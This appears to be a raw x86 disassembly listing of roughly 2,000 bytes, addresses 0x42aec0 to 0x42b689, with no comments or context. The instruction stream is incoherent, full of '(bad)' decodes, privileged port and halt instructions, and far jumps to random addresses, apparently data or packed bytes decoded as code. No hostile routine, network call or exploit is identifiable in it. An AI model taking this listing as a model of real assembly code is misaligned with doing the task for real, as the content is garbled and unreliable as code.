  42aec0:	xor    DWORD PTR [ecx+edi*1],ebp
  42aec3:	pop    esi
  42aec4:	mov    ds:0xf4a01d25,al
  42aec9:	fst    QWORD PTR [esi]
  42aecb:	mov    ecx,0xa91f59e7
  42aed0:	stc    
  42aed1:	rcr    bh,0xbe
  42aed4:	push   ecx
  42aed5:	dec    esp
  42aed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aed7:	js     0x42af43
  42aed9:	mov    bl,0xdf
  42aedb:	hlt    
  42aedc:	ins    DWORD PTR es:[edi],dx
  42aedd:	cmp    eax,0xc57f22e
  42aee2:	scas   al,BYTE PTR es:[edi]
  42aee3:	cmp    ebx,DWORD PTR [esi*1-0x6d94fac7]
  42aeea:	pop    bp
  42aeec:	push   0x7
  42aeee:	js     0x42af1f
  42aef0:	dec    eax
  42aef1:	popa   
  42aef2:	ud0    esp,eax
  42aef5:	test   BYTE PTR [ebx+0x154072b8],cl
  42aefb:	mov    ds:0x323ea2b9,eax
  42af00:	xchg   edi,eax
  42af01:	push   ebp
  42af02:	sub    eax,0xb4ba83a
  42af07:	xchg   esp,eax
  42af08:	mov    eax,ds:0x51af8988
  42af0d:	call   0xf9e5:0x231497f0
  42af14:	fwait
  42af15:	mov    dl,0x61
  42af17:	repnz add eax,0xc52cebc8
  42af1d:	cli    
  42af1e:	loop   0x42af16
  42af20:	pop    ebp
  42af21:	mov    ebx,0x8d709561
  42af26:	(bad)  
  42af27:	xor    cl,al
  42af29:	mov    eax,ds:0xfe4d3f4a
  42af2e:	xor    esp,DWORD PTR [edi-0x2d631529]
  42af34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af35:	mov    esi,0x5ea1c25f
  42af3a:	xchg   ebp,eax
  42af3b:	sub    al,0xac
  42af3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af3e:	and    dh,bh
  42af40:	mov    ecx,0xe45085ab
  42af45:	xchg   edx,eax
  42af46:	pusha  
  42af47:	imul   edx,DWORD PTR [edx-0x39],0x26
  42af4b:	dec    ebx
  42af4c:	aas    
  42af4d:	push   ds
  42af4e:	das    
  42af4f:	pop    edi
  42af50:	jns    0x42af19
  42af52:	aad    0xe9
  42af54:	or     BYTE PTR [ecx-0x5f4b7dec],dh
  42af5a:	lock xor al,0x4f
  42af5d:	imul   ecx,DWORD PTR [eax+0x56],0xe53f51de
  42af64:	jno    0x42af9f
  42af66:	mov    esi,0x8ac0c065
  42af6b:	mov    edi,0x780acc57
  42af70:	add    eax,0xdf048f7f
  42af75:	stos   DWORD PTR es:[edi],eax
  42af76:	dec    eax
  42af77:	retf   
  42af78:	ds cdq 
  42af7a:	or     BYTE PTR [ebx+ebx*8],bl
  42af7d:	mov    dl,0x87
  42af7f:	frstor [edx+0x1c]
  42af82:	mov    bh,0x31
  42af84:	pop    ss
  42af85:	xchg   edx,eax
  42af86:	xchg   ebp,eax
  42af87:	mov    edi,0x1fcb1db3
  42af8c:	jmp    0xf270:0xa3ef2357
  42af93:	aad    0xa0
  42af95:	push   0x71
  42af97:	cs mov dh,0x1a
  42af9a:	imul   edi,DWORD PTR ds:0x7dcb467f,0x624dfad2
  42afa4:	xchg   esp,eax
  42afa5:	pop    edx
  42afa6:	cmp    eax,0x43c09412
  42afab:	mov    ebp,0x13e57bfe
  42afb0:	push   0x492a3aa7
  42afb5:	adc    ebp,DWORD PTR [edi+esi*8-0x7004e7b6]
  42afbc:	das    
  42afbd:	jb     0x42afba
  42afbf:	(bad)  
  42afc1:	and    al,0xf9
  42afc3:	test   al,0x10
  42afc5:	push   0xc81eeb73
  42afca:	push   ss
  42afcb:	pop    eax
  42afcc:	lea    edx,[edi-0x48ae0464]
  42afd2:	lea    esp,[edi-0x4]
  42afd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afd6:	out    0xd6,eax
  42afd8:	sbb    BYTE PTR [ebp-0x76],bh
  42afdb:	inc    edx
  42afdc:	idiv   dh
  42afde:	sub    al,bh
  42afe0:	add    eax,0xe2ca0b97
  42afe5:	ret    0x73ea
  42afe8:	push   es
  42afe9:	out    dx,al
  42afea:	add    DWORD PTR [esi],ecx
  42afec:	xchg   DWORD PTR [edi+0x6d],edi
  42afef:	loope  0x42b033
  42aff1:	jmp    0xedc1:0x5677f6fe
  42aff8:	rol    cl,1
  42affa:	mov    al,ds:0x389baac3
  42afff:	aas    
  42b000:	push   ecx
  42b001:	push   0x9290fbe7
  42b006:	inc    edi
  42b007:	fnsave [eax+0x5f933c59]
  42b00d:	in     eax,0x27
  42b00f:	mov    edx,0x3f0fb187
  42b014:	adc    bl,BYTE PTR [ecx+0x7e]
  42b017:	in     al,0x94
  42b019:	ja     0x42b081
  42b01b:	ret    0xef98
  42b01e:	js     0x42b09d
  42b020:	stos   DWORD PTR es:[edi],eax
  42b021:	dec    DWORD PTR [edi-0x770eb94f]
  42b027:	popa   
  42b028:	or     DWORD PTR ds:0xe4bc2ca2,eax
  42b02e:	je     0x42b08f
  42b030:	xchg   edi,eax
  42b031:	sub    BYTE PTR [ebp+0x67c05539],dl
  42b037:	inc    edi
  42b038:	out    0xc3,al
  42b03a:	aaa    
  42b03b:	jne    0x42b0a7
  42b03d:	add    DWORD PTR [ecx-0x7],eax
  42b040:	inc    esp
  42b041:	xor    BYTE PTR [edx-0x7d983fd3],ch
  42b047:	imul   esi,DWORD PTR [bx+si+0x77],0x1d
  42b04c:	test   DWORD PTR [ebx-0x1e],0xe6203689
  42b053:	das    
  42b054:	jge    0x42b08c
  42b056:	mov    ch,0xa
  42b058:	test   DWORD PTR [edx+0x6e],esi
  42b05b:	ja     0x42b031
  42b05d:	mov    ebp,0xc55e598e
  42b062:	or     DWORD PTR fs:0x5737c919,esp
  42b069:	leave  
  42b06a:	daa    
  42b06b:	(bad)  
  42b06d:	jle    0x42b00a
  42b06f:	or     cl,BYTE PTR [eax]
  42b071:	xchg   ebx,eax
  42b072:	(bad)  
  42b073:	mov    eax,ds:0xbdf7c6a0
  42b078:	jp     0x42b016
  42b07a:	or     eax,0xc3647823
  42b07f:	add    ah,al
  42b081:	into   
  42b082:	mov    bl,0x6
  42b084:	jne    0x42b070
  42b086:	iret   
  42b087:	fidivr WORD PTR [ecx+0x311f86bf]
  42b08d:	cmp    esp,DWORD PTR [ecx+eiz*8+0x64]
  42b091:	scas   al,BYTE PTR es:[edi]
  42b092:	sbb    al,0x9b
  42b094:	fidiv  WORD PTR [eax+0x6da9063e]
  42b09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b09b:	add    dh,cl
  42b09d:	retf   0x8a23
  42b0a0:	(bad)
  42b0a4:	push   ecx
  42b0a5:	iret   
  42b0a6:	(bad)  
  42b0a7:	std    
  42b0a8:	rcl    DWORD PTR [ebp+eax*8+0x54],cl
  42b0ac:	enter  0xf544,0xdf
  42b0b0:	push   0x4b
  42b0b2:	sub    eax,0xec968dc7
  42b0b7:	jae    0x42b0d0
  42b0b9:	rcr    DWORD PTR [edx+0x3e],cl
  42b0bc:	jle    0x42b066
  42b0be:	inc    ecx
  42b0bf:	imul   ebx,DWORD PTR [eax+0x2b1ab60b],0x94d31f38
  42b0c9:	dec    edi
  42b0ca:	imul   ecx,DWORD PTR [edx+ebx*1-0x63],0xffffffa1
  42b0cf:	sahf   
  42b0d0:	and    DWORD PTR gs:[ebp-0x66],edx
  42b0d4:	scas   eax,DWORD PTR es:[edi]
  42b0d5:	scas   al,BYTE PTR es:[edi]
  42b0d6:	(bad)  
  42b0d8:	jle    0x42b0fa
  42b0da:	dec    esp
  42b0db:	jg     0x42b128
  42b0dd:	or     cl,BYTE PTR [ebx]
  42b0df:	out    0xe,eax
  42b0e1:	mov    eax,edi
  42b0e3:	mov    ah,0xe1
  42b0e5:	add    DWORD PTR [edi+0x3b235b58],0x3
  42b0ec:	cmc    
  42b0ed:	sbb    esp,DWORD PTR [ebx]
  42b0ef:	test   DWORD PTR [esp+esi*4+0x97835e0],edi
  42b0f6:	push   ebp
  42b0f7:	mov    bh,0xc4
  42b0f9:	aaa    
  42b0fa:	int3   
  42b0fb:	inc    ebp
  42b0fc:	cmp    al,0x75
  42b0fe:	imul   esi,DWORD PTR [edi+0x2c],0x2d85113e
  42b105:	(bad)  
  42b106:	pop    ss
  42b107:	stos   BYTE PTR es:[edi],al
  42b108:	push   ds
  42b109:	dec    esi
  42b10a:	xor    al,0xda
  42b10c:	pop    ecx
  42b10d:	fcomp  st(3)
  42b10f:	jl     0x42b112
  42b111:	push   ebp
  42b112:	fcom   st(1)
  42b114:	std    
  42b115:	mov    ds:0xc24ed85c,eax
  42b11a:	push   ebx
  42b11b:	push   es
  42b11c:	cmp    dl,ah
  42b11e:	pop    ebp
  42b11f:	and    ch,cl
  42b121:	xchg   BYTE PTR [ebp+edx*8+0x34],ch
  42b125:	sub    edx,DWORD PTR [ebx]
  42b127:	push   ecx
  42b128:	hlt    
  42b129:	push   ecx
  42b12a:	or     cl,bl
  42b12c:	into   
  42b12d:	xor    al,0x44
  42b12f:	push   es
  42b130:	(bad)  
  42b131:	out    dx,al
  42b132:	jle    0x42b0fc
  42b134:	fwait
  42b135:	mov    edi,0xc720d519
  42b13a:	push   esi
  42b13b:	mov    BYTE PTR [ebp+0x1a],ch
  42b13e:	xchg   esi,eax
  42b13f:	pop    ds
  42b140:	jmp    0x42b198
  42b142:	lods   al,BYTE PTR ds:[esi]
  42b143:	(bad)
  42b146:	popf   
  42b147:	fsubp  st(5),st
  42b149:	push   cs
  42b14a:	bound  edi,QWORD PTR [edi]
  42b14c:	jmp    0x307e5179
  42b151:	mov    al,0xe9
  42b153:	fimul  WORD PTR [esi+0x49]
  42b156:	xor    DWORD PTR [ecx+0x17352d29],edi
  42b15c:	mov    dh,0x44
  42b15e:	push   ecx
  42b15f:	shr    DWORD PTR [edx],cl
  42b161:	(bad)  
  42b162:	aam    0x2e
  42b164:	or     esi,DWORD PTR [edx+edi*8-0x2d]
  42b168:	adc    edi,DWORD PTR [esi+0x75]
  42b16b:	cmp    al,0xbc
  42b16d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b16f:	inc    edx
  42b170:	push   esi
  42b171:	icebp  
  42b172:	sbb    eax,DWORD PTR [ebx+ebx*2+0x1d0e672c]
  42b179:	adc    eax,0x14670b9e
  42b17e:	jmp    0xba881f4a
  42b183:	mov    ah,bh
  42b185:	jae    0x42b19b
  42b187:	ror    BYTE PTR [esi+0x66ebf408],cl
  42b18d:	mov    bl,0xfe
  42b18f:	jo     0x42b18f
  42b191:	mov    ds:0x32bd75e2,eax
  42b196:	cli    
  42b197:	mov    ah,0x88
  42b199:	out    dx,al
  42b19a:	clc    
  42b19b:	xor    esp,DWORD PTR [ecx]
  42b19d:	imul   esp,DWORD PTR [ebx-0x25],0xffffff99
  42b1a1:	and    ebp,DWORD PTR [ebx-0x32]
  42b1a4:	xchg   eax,edi
  42b1a6:	pop    ecx
  42b1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1a8:	inc    esi
  42b1a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1aa:	repz (bad) 
  42b1ac:	sub    eax,0x38bc0889
  42b1b1:	cmp    DWORD PTR [ecx+ebp*1],esp
  42b1b4:	fcomp  st(5)
  42b1b6:	cli    
  42b1b7:	fcompp 
  42b1b9:	and    dh,BYTE PTR [edi-0x33]
  42b1bc:	aas    
  42b1bd:	lea    edi,[edi]
  42b1bf:	icebp  
  42b1c0:	sbb    esi,DWORD PTR [ecx-0x16]
  42b1c3:	mov    eax,0xa66fea72
  42b1c8:	or     BYTE PTR [esi],cl
  42b1ca:	jmp    0xf7aa6dd7
  42b1cf:	xchg   ebp,eax
  42b1d0:	fidivr WORD PTR [ecx]
  42b1d2:	hlt    
  42b1d3:	push   edx
  42b1d4:	arpl   WORD PTR [ebx],bp
  42b1d6:	adc    eax,0xceaaf70a
  42b1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b1dd:	inc    esp
  42b1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1df:	stos   BYTE PTR es:[edi],al
  42b1e0:	(bad)  
  42b1e1:	dec    ecx
  42b1e2:	xor    DWORD PTR [esi-0x26b468e],ecx
  42b1e8:	(bad)  [edi]
  42b1ea:	imul   eax,eax,0x6d
  42b1ed:	mov    edi,0x63a76999
  42b1f2:	sar    DWORD PTR [edx-0x1b6ee7ee],1
  42b1f8:	add    DWORD PTR [ecx+edx*4-0xdec8903],0x25
  42b200:	push   0x28ce740c
  42b205:	inc    esi
  42b206:	mov    dh,0xa5
  42b208:	inc    ecx
  42b209:	add    al,0xc6
  42b20b:	add    ecx,DWORD PTR [eax]
  42b20d:	lea    edx,[eax+eiz*4+0x70a0c91a]
  42b214:	je     0x42b278
  42b216:	or     eax,0xeb04828c
  42b21b:	lds    eax,FWORD PTR [eax-0x238597da]
  42b221:	inc    esi
  42b222:	cmp    esi,DWORD PTR [eax-0x79]
  42b225:	adc    ebx,DWORD PTR [ebx-0x41]
  42b228:	pusha  
  42b229:	jns    0x42b23d
  42b22b:	hlt    
  42b22c:	mov    dh,0xfc
  42b22e:	(bad)  
  42b22f:	sub    ebx,DWORD PTR [esi]
  42b231:	jo     0x42b282
  42b233:	mov    al,0x85
  42b235:	lahf   
  42b236:	push   ss
  42b237:	aaa    
  42b238:	fst    QWORD PTR [ebx+0x4cd840a]
  42b23e:	xor    DWORD PTR [ecx-0x20073f93],0xffffff8a
  42b245:	mov    al,0xba
  42b247:	add    al,0x7d
  42b249:	nop
  42b24a:	xor    ebp,0xa08309de
  42b250:	push   ss
  42b251:	push   ebx
  42b252:	xchg   BYTE PTR [ebp+0x6df5060e],al
  42b258:	out    dx,eax
  42b259:	pop    edx
  42b25a:	inc    ebx
  42b25b:	adc    al,0x97
  42b25d:	ret    0xfaf
  42b260:	or     edi,DWORD PTR [edi+0x173d896b]
  42b266:	pop    ecx
  42b267:	mov    ah,0x6a
  42b269:	inc    esp
  42b26a:	and    al,0x98
  42b26c:	sbb    DWORD PTR [esi+0x18],0xffffffcd
  42b270:	and    dh,al
  42b272:	xchg   esi,eax
  42b273:	mov    DWORD PTR [eax+eax*4],ebx
  42b276:	cmp    dl,BYTE PTR [ebx]
  42b278:	retf   0x350c
  42b27b:	mov    dh,0x90
  42b27d:	sub    eax,0x1dc60548
  42b282:	mov    ebp,0x2b51ba2c
  42b287:	sti    
  42b288:	jno    0x42b2ed
  42b28a:	mov    ds:0x5ec8158f,eax
  42b28f:	ja     0x42b26c
  42b291:	retf   0x5886
  42b294:	mov    ds:0x617e9512,al
  42b299:	int3   
  42b29a:	cwde   
  42b29b:	into   
  42b29c:	or     DWORD PTR ss:[eax],eax
  42b29f:	call   FWORD PTR [ecx-0x41b0ef3f]
  42b2a5:	aaa    
  42b2a6:	ja     0x42b278
  42b2a8:	inc    ecx
  42b2a9:	xchg   esi,ecx
  42b2ab:	mov    ds:0x70449638,al
  42b2b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b2b1:	jle    0x42b289
  42b2b3:	call   0x84b2:0xf293bc1b
  42b2ba:	inc    ebp
  42b2bb:	mov    ebx,0x627c878e
  42b2c0:	mov    edi,DWORD PTR ds:0x3308e46d
  42b2c6:	sbb    eax,0x48fcb737
  42b2cb:	sbb    esp,DWORD PTR [esi+0x765012d1]
  42b2d1:	push   edx
  42b2d2:	pop    esi
  42b2d3:	and    BYTE PTR [ecx],al
  42b2d5:	add    al,0x93
  42b2d7:	rol    ebx,cl
  42b2d9:	aaa    
  42b2da:	test   al,0xc4
  42b2dc:	push   esp
  42b2dd:	sbb    eax,0x51721495
  42b2e2:	aas    
  42b2e3:	nop
  42b2e4:	or     bl,BYTE PTR [esi+0x7]
  42b2e7:	add    bh,dl
  42b2e9:	mov    dh,0x3d
  42b2eb:	(bad)  
  42b2ec:	je     0x42b347
  42b2ee:	fiadd  DWORD PTR [ebp-0x25]
  42b2f1:	mov    ah,0x31
  42b2f3:	cmp    ebp,ebx
  42b2f5:	in     eax,0xbd
  42b2f7:	jae    0x42b344
  42b2f9:	mov    edi,ecx
  42b2fb:	ret    0x26f5
  42b2fe:	and    ebx,DWORD PTR ds:[esi+0x14c46603]
  42b305:	xchg   BYTE PTR [esi-0x1f36220f],al
  42b30b:	and    DWORD PTR [edi],ebp
  42b30d:	lods   al,BYTE PTR ds:[esi]
  42b30e:	add    edi,DWORD PTR [ebx-0x6b]
  42b311:	jle    0x42b325
  42b313:	push   cs
  42b314:	mov    ah,0xe
  42b316:	cwde   
  42b317:	sar    bl,cl
  42b319:	call   0x96a3d511
  42b31e:	lock shr BYTE PTR [edi+eiz*1+0x34bd9654],0x99
  42b327:	into   
  42b328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b329:	mov    ah,0x12
  42b32b:	push   ss
  42b32c:	inc    esp
  42b32d:	shr    DWORD PTR [ebp+0x59],1
  42b330:	out    dx,al
  42b331:	adc    dl,BYTE PTR [edx]
  42b333:	fmulp  st(6),st
  42b335:	stc    
  42b336:	add    al,0x8f
  42b338:	sti    
  42b339:	jg     0x42b326
  42b33b:	ret    0x45ee
  42b33e:	adc    al,0xac
  42b340:	stos   BYTE PTR es:[edi],al
  42b341:	fmul   QWORD PTR [esi-0x3241f3e9]
  42b347:	mov    dl,0xd0
  42b349:	popf   
  42b34a:	mov    BYTE PTR [edx+ebx*1+0x458e2538],0x2d
  42b352:	ret    
  42b353:	daa    
  42b354:	add    eax,0x1e895099
  42b359:	add    eax,0x16e81fdd
  42b35e:	sub    BYTE PTR [edx-0x170c3995],ch
  42b364:	inc    edi
  42b365:	(bad)  
  42b366:	div    ch
  42b368:	or     ch,bl
  42b36a:	repnz add BYTE PTR [esi],0x13
  42b36e:	pop    edx
  42b36f:	jecxz  0x42b306
  42b371:	inc    ecx
  42b372:	sahf   
  42b373:	test   BYTE PTR [edx],dh
  42b375:	data16 sahf 
  42b377:	jmp    0x65a2224d
  42b37c:	and    esi,DWORD PTR [ecx-0x27]
  42b37f:	daa    
  42b380:	in     eax,dx
  42b381:	in     eax,dx
  42b382:	or     esi,DWORD PTR [esi]
  42b384:	(bad)  [ecx]
  42b386:	mov    edi,0x466ebdd3
  42b38b:	cs mov ah,0x34
  42b38e:	out    dx,eax
  42b38f:	test   edi,ebp
  42b391:	jl     0x42b361
  42b393:	jecxz  0x42b32c
  42b395:	xor    DWORD PTR ds:0xc51ec6a3,esi
  42b39b:	arpl   di,bx
  42b39d:	mov    esp,0xe96ddf6b
  42b3a2:	mov    ss,WORD PTR [ebx+0x7ca68fd7]
  42b3a8:	lock sub DWORD PTR gs:[eax-0x7357d5d5],0x1d
  42b3b1:	cmp    DWORD PTR [esi+eax*1-0x49576e80],edx
  42b3b8:	aad    0xeb
  42b3ba:	js     0x42b40d
  42b3bc:	and    al,0xf8
  42b3be:	test   BYTE PTR [edi+0x4d],0x2
  42b3c2:	push   ebx
  42b3c3:	xor    DWORD PTR [esp+ebx*8],ecx
  42b3c6:	rol    dl,0x5a
  42b3c9:	fnsave [edx]
  42b3cb:	lock cli 
  42b3cd:	fsub   QWORD PTR [ebx]
  42b3cf:	sbb    ah,BYTE PTR [edx-0x4d]
  42b3d2:	push   cs
  42b3d3:	aad    0x52
  42b3d5:	xor    al,al
  42b3d7:	aaa    
  42b3d8:	enter  0xacaa,0xcd
  42b3dc:	aad    0x5d
  42b3de:	jae    0x42b3d0
  42b3e0:	sar    BYTE PTR [ecx-0xb92f209],0xfb
  42b3e7:	daa    
  42b3e8:	add    eax,0xcf2c77bd
  42b3ed:	mov    ah,0xdd
  42b3ef:	cmp    DWORD PTR [edx-0x23ed19b0],edx
  42b3f5:	imul   edi,DWORD PTR [ecx-0x58bde059],0x333f85
  42b3ff:	in     eax,0xe7
  42b401:	jnp    0x42b43f
  42b403:	(bad)  
  42b404:	cmp    eax,0xd39e81b6
  42b409:	xlat   BYTE PTR ds:[ebx]
  42b40a:	cdq    
  42b40b:	stos   DWORD PTR es:[edi],eax
  42b40c:	cwde   
  42b40d:	popf   
  42b40e:	inc    edx
  42b40f:	rol    BYTE PTR [eax+ebx*1],1
  42b412:	xchg   ebp,eax
  42b413:	push   edx
  42b414:	shl    BYTE PTR [esi+ecx*1],cl
  42b417:	push   ebx
  42b418:	repz scas eax,DWORD PTR es:[edi]
  42b41a:	jecxz  0x42b3f9
  42b41c:	aam    0x47
  42b41e:	inc    edi
  42b41f:	ja     0x42b45d
  42b421:	cld    
  42b422:	rcr    eax,0x1e
  42b425:	or     eax,0x133276fe
  42b42a:	inc    edi
  42b42b:	sbb    eax,0x5624d514
  42b430:	push   ss
  42b431:	xchg   BYTE PTR [ebp+0x67],bh
  42b434:	push   edx
  42b435:	lods   eax,DWORD PTR ds:[esi]
  42b436:	sub    ebx,DWORD PTR [edx]
  42b438:	cdq    
  42b439:	ror    DWORD PTR [edx-0x3d3136d5],cl
  42b43f:	inc    ebp
  42b440:	addr16 push edi
  42b442:	(bad)  
  42b443:	pop    edx
  42b444:	mov    ebx,0xaad0dc95
  42b449:	(bad)  
  42b44a:	fmul   DWORD PTR [eax]
  42b44c:	push   ecx
  42b44d:	jns    0x42b483
  42b44f:	das    
  42b450:	data16 and bh,bl
  42b453:	xor    edi,DWORD PTR [eax-0x72]
  42b456:	aam    0x4
  42b458:	arpl   WORD PTR [ebx-0x787df9e7],ax
  42b45e:	push   ss
  42b45f:	xchg   edi,eax
  42b460:	pop    edx
  42b461:	or     dl,ch
  42b463:	sbb    al,0x1e
  42b465:	inc    BYTE PTR [esi]
  42b467:	int3   
  42b468:	sub    bh,ah
  42b46a:	push   0x65
  42b46c:	jae    0x42b46f
  42b46e:	gs and eax,0x759537ef
  42b474:	stos   BYTE PTR es:[edi],al
  42b475:	push   edi
  42b476:	enter  0x26d2,0x7d
  42b47a:	daa    
  42b47b:	or     DWORD PTR [edx-0x57],ebx
  42b47e:	adc    DWORD PTR fs:[esi-0x1538961f],ebp
  42b485:	test   al,0x60
  42b487:	cmp    DWORD PTR [ecx],eax
  42b489:	sbb    dh,BYTE PTR [edi+edi*2+0x48751e80]
  42b490:	fiadd  DWORD PTR [ebx-0x6f]
  42b493:	adc    ebx,DWORD PTR [ebx]
  42b495:	out    dx,al
  42b496:	cwde   
  42b497:	ja     0x42b4a3
  42b499:	adc    al,BYTE PTR ds:0x6bf3ff62
  42b49f:	mov    edx,0x5c3c2ff3
  42b4a4:	ret    0x9aa2
  42b4a7:	dec    ecx
  42b4a8:	sbb    al,BYTE PTR [esi-0x58a6819a]
  42b4ae:	loopne 0x42b50a
  42b4b0:	daa    
  42b4b1:	push   0x5a
  42b4b3:	test   al,0x3c
  42b4b5:	retf   0xbf67
  42b4b8:	and    bh,cl
  42b4ba:	in     al,dx
  42b4bb:	arpl   WORD PTR [ebp-0x4be8e109],di
  42b4c1:	arpl   WORD PTR [edx-0x4d],bx
  42b4c4:	repz cmp ebx,DWORD PTR [ebp+edx*4-0x34]
  42b4c9:	sub    al,dl
  42b4cb:	push   esi
  42b4cc:	fdiv   QWORD PTR ds:0xf9f27b0c
  42b4d2:	dec    ecx
  42b4d3:	jno    0x42b48d
  42b4d5:	inc    esp
  42b4d6:	js     0x42b501
  42b4d8:	retf   
  42b4d9:	pop    ss
  42b4da:	out    dx,al
  42b4db:	and    al,0x14
  42b4dd:	lahf   
  42b4de:	lock mov bl,0xbd
  42b4e1:	loop   0x42b476
  42b4e3:	mov    bh,0x9d
  42b4e5:	imul   edx,ebx,0x27
  42b4e8:	inc    esp
  42b4e9:	js     0x42b4ca
  42b4eb:	jmp    0x8a44364d
  42b4f0:	or     BYTE PTR [edi+0x2769c7c0],bh
  42b4f6:	clc    
  42b4f7:	outs   dx,BYTE PTR ds:[esi]
  42b4f8:	stos   BYTE PTR es:[edi],al
  42b4f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4fa:	pop    ecx
  42b4fb:	int    0xde
  42b4fd:	sub    ecx,DWORD PTR [esi]
  42b4ff:	call   0x74b7b860
  42b504:	xor    eax,0x3945dbef
  42b509:	fisub  DWORD PTR [eax-0x37b041cc]
  42b50f:	and    al,0xe3
  42b511:	arpl   WORD PTR [ecx-0x13d4c0ad],ax
  42b517:	sbb    DWORD PTR [ebx-0x55],0xf0f4d871
  42b51e:	jno    0x42b58d
  42b520:	gs or  al,0x7a
  42b523:	mov    bh,0xe1
  42b525:	mov    ah,BYTE PTR [edx-0x31890d80]
  42b52b:	xor    ebp,DWORD PTR [edx+0x1a]
  42b52e:	ds dec ecx
  42b530:	xchg   ebp,ecx
  42b532:	cwde   
  42b533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b534:	cmp    DWORD PTR [esp+esi*2],eax
  42b537:	push   ebp
  42b538:	mov    ecx,0x6f21b7c6
  42b53d:	dec    eax
  42b53e:	fcom   DWORD PTR [ebp-0x575e1bca]
  42b544:	out    dx,eax
  42b545:	test   BYTE PTR [ebp-0x40],bh
  42b548:	repz je 0x42b572
  42b54b:	mov    bl,0x5e
  42b54d:	push   esp
  42b54e:	xchg   BYTE PTR [esi-0x5621a5b7],bh
  42b554:	cdq    
  42b555:	and    BYTE PTR [ecx+0x2d426fd2],dh
  42b55b:	repz inc edx
  42b55d:	pusha  
  42b55e:	outs   dx,BYTE PTR ds:[esi]
  42b55f:	in     al,0x91
  42b561:	lods   al,BYTE PTR ds:[esi]
  42b562:	adc    DWORD PTR [edi-0x12606e51],0xffffff8d
  42b569:	mov    edi,0xe0a938b6
  42b56e:	data16 test al,0x30
  42b571:	(bad)  
  42b572:	adc    BYTE PTR [edi+0x7cf1bcf],dh
  42b578:	sub    al,0xe
  42b57a:	jg     0x42b5f3
  42b57c:	sbb    bl,bl
  42b57e:	sbb    BYTE PTR [eax+0x6a],bl
  42b581:	into   
  42b582:	call   0x2a5c:0x2c53af53
  42b589:	push   edx
  42b58a:	jmp    0x8620:0x53116d6b
  42b591:	adc    BYTE PTR [ebp-0x6e],cl
  42b594:	pop    esp
  42b595:	outs   dx,DWORD PTR ds:[esi]
  42b596:	xor    DWORD PTR [edi+ebp*4],eax
  42b599:	dec    ecx
  42b59a:	(bad)  
  42b59b:	and    bl,cl
  42b59d:	cmp    BYTE PTR [ecx-0xd],ch
  42b5a0:	jle    0x42b5ea
  42b5a2:	add    WORD PTR [eax-0x42],ax
  42b5a6:	cmp    eax,0x39ec5de8
  42b5ab:	push   eax
  42b5ac:	dec    BYTE PTR [esi+0x5b57d032]
  42b5b2:	jmp    0xdc195d41
  42b5b7:	(bad)
  42b5ba:	cdq    
  42b5bb:	pop    esp
  42b5bc:	stos   BYTE PTR es:[edi],al
  42b5bd:	movnti DWORD PTR [edx-0x34],ebx
  42b5c1:	sbb    eax,0xfb9998d
  42b5c6:	jmp    0x42b577
  42b5c8:	or     DWORD PTR [ebp-0x54],edi
  42b5cb:	add    al,0xe8
  42b5cd:	imul   esp,DWORD PTR [ecx],0xffffff8c
  42b5d0:	sbb    DWORD PTR [edx+0x47a9a8a6],eax
  42b5d6:	mov    ebx,0xc20c068e
  42b5db:	test   DWORD PTR [eax-0x49cb6b3c],esp
  42b5e1:	sub    ecx,DWORD PTR [edi-0x52]
  42b5e4:	mov    eax,0x7588041a
  42b5e9:	call   0x7eca90d1
  42b5ee:	mov    BYTE PTR [edx+edi*8-0x68],ch
  42b5f2:	mov    ecx,0xfe7dd5e
  42b5f7:	add    DWORD PTR [ebp+0x1b2d04b4],esi
  42b5fd:	shl    BYTE PTR [eax+edx*8+0x1411c21e],cl
  42b604:	sbb    al,ah
  42b606:	retf   0xaa2
  42b609:	int    0x78
  42b60b:	sti    
  42b60c:	mov    ah,0x19
  42b60e:	jmp    0x588cc250
  42b613:	adc    dl,dl
  42b615:	stos   DWORD PTR es:[edi],eax
  42b616:	sti    
  42b617:	dec    eax
  42b618:	enter  0x18a4,0x8d
  42b61c:	inc    ebx
  42b61d:	lods   al,BYTE PTR ds:[esi]
  42b61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b61f:	pop    es
  42b620:	and    eax,DWORD PTR ds:0x80f7b949
  42b626:	retf   
  42b627:	aaa    
  42b628:	cld    
  42b629:	xchg   ebx,eax
  42b62a:	int3   
  42b62b:	adc    al,0x72
  42b62d:	dec    esp
  42b62e:	popa   
  42b62f:	rcl    BYTE PTR [ebp+0x1],0x36
  42b633:	sbb    cl,bh
  42b635:	mov    ebp,0x90e3a243
  42b63a:	push   0xe0e7a53b
  42b63f:	push   es
  42b640:	(bad)  
  42b641:	stc    
  42b642:	cmp    ebp,DWORD PTR [esi+0x326346fb]
  42b648:	jns    0x42b6aa
  42b64a:	pushf  
  42b64b:	out    0x1e,eax
  42b64d:	ja     0x42b619
  42b64f:	ret    0x34fb
  42b652:	push   0xc8f68da9
  42b657:	jecxz  0x42b60b
  42b659:	outs   dx,DWORD PTR ds:[esi]
  42b65a:	imul   ebx,esi,0x5c10e4bd
  42b660:	jl     0x42b67d
  42b662:	mov    ecx,0xdf0639e
  42b667:	fidiv  WORD PTR [ecx+edi*1]
  42b66a:	mov    ah,0x1e
  42b66c:	sub    al,0x70
  42b66e:	enter  0xdec0,0x2d
  42b672:	adc    bh,dl
  42b674:	jno    0x42b6c3
  42b676:	scas   al,BYTE PTR es:[edi]
  42b677:	xchg   bl,ah
  42b679:	daa    
  42b67a:	repz xchg edi,eax
  42b67c:	jle    0x42b6f8
  42b67e:	retf   
  42b67f:	xor    eax,0x3f40b5c5
  42b684:	jns    0x42b676
  42b686:	mov    dh,0xba
  42b688:	(bad)  
  42b689:	xor    al,0xf1
